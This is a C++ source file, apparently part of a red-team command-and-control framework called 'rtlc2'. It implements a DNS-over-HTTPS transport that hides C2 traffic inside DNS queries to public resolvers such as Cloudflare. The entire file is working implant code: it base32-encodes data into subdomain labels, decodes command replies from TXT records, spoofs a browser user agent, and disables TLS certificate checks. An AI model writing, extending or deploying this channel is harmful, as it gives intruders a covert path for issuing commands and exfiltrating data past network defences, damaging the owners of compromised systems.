// DNS-over-HTTPS (DoH) Transport - Tunnel C2 DNS queries through HTTPS
// Traffic appears as standard HTTPS to DoH resolvers (Cloudflare, Google, etc.)
// Server-side DNS listener handles queries unchanged.
#include "transport.h"
#include <cstring>
#include <cstdlib>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#else
#include <curl/curl.h>
#include <openssl/rand.h>
#endif

namespace rtlc2 {
namespace transport {

static const char DOH_BASE32_CHARS[] = "abcdefghijklmnopqrstuvwxyz234567";

// ─── Constructor / Destructor ────────────────────────────────────────────────

DoHTransport::DoHTransport(const std::string& resolver_url, const std::string& domain,
                           const std::string& dns_server, int dns_port)
    : resolver_url_(resolver_url), domain_(domain),
      dns_server_(dns_server), dns_port_(dns_port), connected_(false) {}

DoHTransport::~DoHTransport() {
    Disconnect();
}

// ─── Transport Interface ─────────────────────────────────────────────────────

bool DoHTransport::Connect() {
    connected_ = true;
    return true;
}

void DoHTransport::Disconnect() {
    connected_ = false;
}

bool DoHTransport::IsConnected() const {
    return connected_;
}

// ─── Base32 Encode / Decode ──────────────────────────────────────────────────

std::string DoHTransport::Base32Encode(const std::vector<uint8_t>& data) {
    std::string result;
    int bits = 0;
    int buffer = 0;

    for (uint8_t byte : data) {
        buffer = (buffer << 8) | byte;
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            result += DOH_BASE32_CHARS[(buffer >> bits) & 0x1F];
        }
    }
    if (bits > 0) {
        result += DOH_BASE32_CHARS[(buffer << (5 - bits)) & 0x1F];
    }
    return result;
}

std::vector<uint8_t> DoHTransport::Base32Decode(const std::string& encoded) {
    std::vector<uint8_t> result;
    int bits = 0;
    int buffer = 0;

    for (char c : encoded) {
        int val = -1;
        if (c >= 'a' && c <= 'z') val = c - 'a';
        else if (c >= '2' && c <= '7') val = c - '2' + 26;
        if (val < 0) continue;

        buffer = (buffer << 5) | val;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            result.push_back((uint8_t)(buffer >> bits));
        }
    }
    return result;
}

// ─── DNS Wire Format Helpers ─────────────────────────────────────────────────

std::vector<uint8_t> DoHTransport::BuildDNSQuery(const std::string& subdomain, uint16_t type) {
    std::vector<uint8_t> packet;

    // Transaction ID (crypto-random to prevent DNS cache poisoning)
    uint16_t txid = 0;
#ifdef RTLC2_WINDOWS
    typedef long (WINAPI *BCryptGenRandom_t)(void*, unsigned char*, unsigned long, unsigned long);
    HMODULE hBcrypt = LoadLibraryA("bcrypt.dll");
    if (hBcrypt) {
        auto pBCryptGenRandom = (BCryptGenRandom_t)GetProcAddress(hBcrypt, "BCryptGenRandom");
        if (pBCryptGenRandom) {
            pBCryptGenRandom(NULL, (unsigned char*)&txid, sizeof(txid), 0x00000002 /*BCRYPT_USE_SYSTEM_PREFERRED_RNG*/);
        }
        FreeLibrary(hBcrypt);
    }
    if (txid == 0) txid = (uint16_t)(rand() & 0xFFFF);
#else
    if (RAND_bytes((unsigned char*)&txid, sizeof(txid)) != 1) {
        txid = (uint16_t)(rand() & 0xFFFF);
    }
#endif
    packet.push_back((uint8_t)(txid >> 8));
    packet.push_back((uint8_t)(txid & 0xFF));

    // Flags: standard query, recursion desired
    packet.push_back(0x01); // QR=0, OPCODE=0, RD=1
    packet.push_back(0x00);

    // Questions: 1
    packet.push_back(0x00); packet.push_back(0x01);
    // Answers: 0
    packet.push_back(0x00); packet.push_back(0x00);
    // Authority: 0
    packet.push_back(0x00); packet.push_back(0x00);
    // Additional: 0
    packet.push_back(0x00); packet.push_back(0x00);

    // QNAME: subdomain.domain
    std::string fullDomain = subdomain + "." + domain_;
    size_t pos = 0;
    while (pos < fullDomain.size()) {
        size_t dot = fullDomain.find('.', pos);
        if (dot == std::string::npos) dot = fullDomain.size();
        size_t labelLen = dot - pos;
        if (labelLen > 63) labelLen = 63; // DNS label max
        packet.push_back((uint8_t)labelLen);
        for (size_t i = 0; i < labelLen; i++) {
            packet.push_back((uint8_t)fullDomain[pos + i]);
        }
        pos = dot + 1;
    }
    packet.push_back(0x00); // Root label

    // QTYPE
    packet.push_back((uint8_t)(type >> 8));
    packet.push_back((uint8_t)(type & 0xFF));

    // QCLASS: IN
    packet.push_back(0x00); packet.push_back(0x01);

    return packet;
}

std::vector<uint8_t> DoHTransport::ParseDNSTXTResponse(const std::vector<uint8_t>& response) {
    if (response.size() < 12) return {};

    // Skip header
    uint16_t qdcount = (response[4] << 8) | response[5];
    uint16_t ancount = (response[6] << 8) | response[7];

    // Skip question section
    size_t offset = 12;
    for (int q = 0; q < qdcount && offset < response.size(); q++) {
        while (offset < response.size() && response[offset] != 0) {
            if ((response[offset] & 0xC0) == 0xC0) {
                offset += 2; break;
            }
            offset += response[offset] + 1;
        }
        if (offset < response.size() && response[offset] == 0) offset++;
        offset += 4; // QTYPE + QCLASS
    }

    // Parse answer section
    std::vector<uint8_t> result;
    for (int a = 0; a < ancount && offset < response.size(); a++) {
        // Skip name (possibly compressed)
        if ((response[offset] & 0xC0) == 0xC0) {
            offset += 2;
        } else {
            while (offset < response.size() && response[offset] != 0)
                offset += response[offset] + 1;
            offset++; // skip null
        }

        if (offset + 10 > response.size()) break;

        uint16_t rtype = (response[offset] << 8) | response[offset + 1];
        offset += 2; // type
        offset += 2; // class
        offset += 4; // TTL
        uint16_t rdlength = (response[offset] << 8) | response[offset + 1];
        offset += 2;

        if (rtype == 16) { // TXT record
            size_t end = offset + rdlength;
            while (offset < end && offset < response.size()) {
                uint8_t txtLen = response[offset++];
                for (uint8_t i = 0; i < txtLen && offset < response.size(); i++) {
                    result.push_back(response[offset++]);
                }
            }
        } else {
            offset += rdlength;
        }
    }

    return result;
}

// ─── Send: encode data as DNS query, POST to DoH resolver ───────────────────

Response DoHTransport::Send(const std::vector<uint8_t>& data) {
    Response resp = {};
    if (!connected_) {
        resp.error = "Not connected";
        return resp;
    }

    // Base32-encode data and split into DNS subdomain labels (max 63 chars each)
    std::string encoded = Base32Encode(data);
    std::string subdomain;
    for (size_t i = 0; i < encoded.size(); i += 63) {
        if (!subdomain.empty()) subdomain += ".";
        subdomain += encoded.substr(i, 63);
    }

    // Build DNS wire-format TXT query
    std::vector<uint8_t> dnsQuery = BuildDNSQuery(subdomain, 16); // TXT = 16

    // POST the DNS query to the DoH resolver over HTTPS
    std::vector<uint8_t> dnsResponse;

#ifdef RTLC2_WINDOWS
    // ── WinHTTP implementation ──
    std::wstring wAgent(L"Mozilla/5.0");
    HINTERNET hSession = WinHttpOpen(wAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        resp.error = "WinHttpOpen failed";
        return resp;
    }

    // Parse resolver URL into host + path
    // resolver_url_ is like "https://cloudflare-dns.com/dns-query"
    std::string resolverHost;
    std::string resolverPath = "/dns-query";
    int resolverPort = 443;

    {
        std::string url = resolver_url_;
        // Strip scheme
        size_t schemeEnd = url.find("://");
        if (schemeEnd != std::string::npos) {
            url = url.substr(schemeEnd + 3);
        }
        // Split host/path
        size_t pathStart = url.find('/');
        if (pathStart != std::string::npos) {
            resolverHost = url.substr(0, pathStart);
            resolverPath = url.substr(pathStart);
        } else {
            resolverHost = url;
        }
        // Check for port in host
        size_t colonPos = resolverHost.find(':');
        if (colonPos != std::string::npos) {
            resolverPort = std::atoi(resolverHost.substr(colonPos + 1).c_str());
            resolverHost = resolverHost.substr(0, colonPos);
        }
    }

    std::wstring wHost(resolverHost.begin(), resolverHost.end());
    std::wstring wPath(resolverPath.begin(), resolverPath.end());

    HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), (INTERNET_PORT)resolverPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        resp.error = "WinHttpConnect failed";
        return resp;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resp.error = "WinHttpOpenRequest failed";
        return resp;
    }

    // Disable cert validation for testing
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    // Add DoH-required headers
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/dns-message", -1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Accept: application/dns-message", -1L, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      (LPVOID)dnsQuery.data(), (DWORD)dnsQuery.size(),
                                      (DWORD)dnsQuery.size(), 0);
    if (!result) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resp.error = "WinHttpSendRequest failed";
        return resp;
    }

    result = WinHttpReceiveResponse(hRequest, NULL);
    if (!result) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resp.error = "WinHttpReceiveResponse failed";
        return resp;
    }

    // Read response body (DNS wire-format response)
    DWORD bytesAvailable = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &bytesAvailable);
        if (bytesAvailable > 0) {
            std::vector<uint8_t> buf(bytesAvailable);
            DWORD bytesRead = 0;
            WinHttpReadData(hRequest, buf.data(), bytesAvailable, &bytesRead);
            dnsResponse.insert(dnsResponse.end(), buf.begin(), buf.begin() + bytesRead);
        }
    } while (bytesAvailable > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

#else
    // ── libcurl implementation (POSIX) ──
    CURL* curl = curl_easy_init();
    if (!curl) {
        resp.error = "Failed to init curl";
        return resp;
    }

    // Curl write callback — appends received data into the response vector
    struct CurlWriteCtx {
        std::vector<uint8_t>* buf;
    };
    auto curlWriteCb = +[](void* contents, size_t size, size_t nmemb, void* userp) -> size_t {
        auto* ctx = static_cast<CurlWriteCtx*>(userp);
        size_t total = size * nmemb;
        auto* bytes = static_cast<uint8_t*>(contents);
        ctx->buf->insert(ctx->buf->end(), bytes, bytes + total);
        return total;
    };

    CurlWriteCtx writeCtx = { &dnsResponse };

    curl_easy_setopt(curl, CURLOPT_URL, resolver_url_.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dnsQuery.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, static_cast<long>(dnsQuery.size()));
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteCb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &writeCtx);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);

    // DoH requires these content-type headers
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/dns-message");
    headers = curl_slist_append(headers, "Accept: application/dns-message");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Disable SSL verification (for lab/self-signed environments)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        resp.error = std::string("curl DoH POST failed: ") + curl_easy_strerror(res);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return resp;
    }

    long httpCode = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpCode);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (httpCode != 200) {
        resp.error = "DoH resolver returned HTTP " + std::to_string(httpCode);
        return resp;
    }
#endif

    // Parse the DNS wire-format response for TXT records
    std::vector<uint8_t> txtData = ParseDNSTXTResponse(dnsResponse);
    if (!txtData.empty()) {
        // Base32-decode the TXT record content to get the raw C2 response
        std::string txtStr(txtData.begin(), txtData.end());
        last_response_ = Base32Decode(txtStr);
    } else {
        last_response_.clear();
    }

    resp.success = true;
    resp.status_code = 200;
    resp.body = last_response_;
    return resp;
}

// ─── Receive: return buffered response from last Send ────────────────────────

Response DoHTransport::Receive() {
    Response resp = {};
    if (!connected_) {
        resp.error = "Not connected";
        return resp;
    }

    resp.body = last_response_;
    resp.success = !last_response_.empty();
    resp.status_code = resp.success ? 200 : 204;
    return resp;
}

} // namespace transport
} // namespace rtlc2
